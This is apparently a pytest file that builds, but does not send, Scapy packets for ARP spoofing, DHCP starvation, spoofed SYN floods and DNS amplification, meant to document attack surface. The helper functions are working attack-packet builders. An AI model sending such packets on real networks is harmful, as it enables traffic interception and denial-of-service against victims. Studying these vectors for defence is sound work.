"""
Tests for Scapy-based attack vector packet generation.

These tests do **not** send any traffic. They only ensure that the Scapy
helpers we add for documentation/demo purposes correctly build packets for
common attack vectors. This way we can reason about the attack surface
when using GNU Radio in hostile environments.
"""

from __future__ import annotations

import random

from scapy.all import (
    ARP,
    BOOTP,
    DHCP,
    DNS,
    DNSQR,
    Ether,
    IP,
    TCP,
    UDP,
)


def create_arp_spoof_packet(
    target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str
):
    """Craft an ARP reply that poisons the ARP cache of target."""
    return (
        Ether(dst=target_mac, src=attacker_mac)
        / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    )


def create_dhcp_starvation_packet(random_mac: str):
    """Craft a DHCP DISCOVER message with random MAC/XID."""
    mac_bytes = bytes(int(x, 16) for x in random_mac.split(":"))
    xid = random.randint(0, 0xFFFFFFFF)
    return (
        Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac_bytes + b"\x00" * 10, xid=xid)
        / DHCP(options=[("message-type", "discover"), ("end")])
    )


def create_syn_flood_packet(src_ip: str, dst_ip: str, dst_port: int):
    """Craft a SYN packet with spoofed IP and random values."""
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 0xFFFFFFFF)
    return (
        IP(src=src_ip, dst=dst_ip)
        / TCP(sport=sport, dport=dst_port, flags="S", seq=seq, options=[("MSS", 1460)])
    )


def create_dns_amplification_packet(victim_ip: str, dns_server: str):
    """Craft a DNS ANY query that can trigger amplification."""
    return (
        IP(src=victim_ip, dst=dns_server)
        / UDP(sport=random.randint(1024, 65535), dport=53)
        / DNS(rd=1, qd=DNSQR(qname="example.com", qtype=255))  # QTYPE 255 == ANY
    )


# ---------------------------------------------------------------------------
# Pytest tests
# ---------------------------------------------------------------------------


def test_arp_spoof_packet_fields():
    pkt = create_arp_spoof_packet(
        target_ip="192.0.2.5",
        target_mac="aa:bb:cc:dd:ee:ff",
        spoof_ip="192.0.2.1",
        attacker_mac="de:ad:be:ef:00:01",
    )
    assert pkt.haslayer(ARP)
    arp = pkt[ARP]
    assert arp.op == 2  # ARP reply
    assert arp.pdst == "192.0.2.5"
    assert arp.psrc == "192.0.2.1"
    assert bytes(pkt)  # Ensure packet can be serialized


def test_dhcp_starvation_packet_structure():
    pkt = create_dhcp_starvation_packet("02:00:5e:10:00:01")
    assert pkt.haslayer(BOOTP)
    assert pkt.haslayer(DHCP)
    bootp = pkt[BOOTP]
    dhcp = pkt[DHCP]
    assert bootp.chaddr.startswith(b"\x02\x00^")
    msg_type = [opt for opt in dhcp.options if isinstance(opt, tuple) and opt[0] == "message-type"]
    assert msg_type and msg_type[0][1] == "discover"
    assert bytes(pkt)


def test_syn_flood_packet_flags():
    pkt = create_syn_flood_packet("198.51.100.10", "198.51.100.20", 443)
    assert pkt.haslayer(TCP)
    tcp = pkt[TCP]
    assert tcp.flags == "S"
    assert tcp.dport == 443
    assert bytes(pkt)


def test_dns_amplification_packet_query():
    pkt = create_dns_amplification_packet("203.0.113.10", "8.8.8.8")
    assert pkt.haslayer(DNS)
    dns = pkt[DNS]
    field = dns.qd.get_field("qtype")
    assert field.i2repr(dns.qd, dns.qd.qtype) in {"ANY", "ALL"}
    assert dns.rd == 1
    assert bytes(pkt)
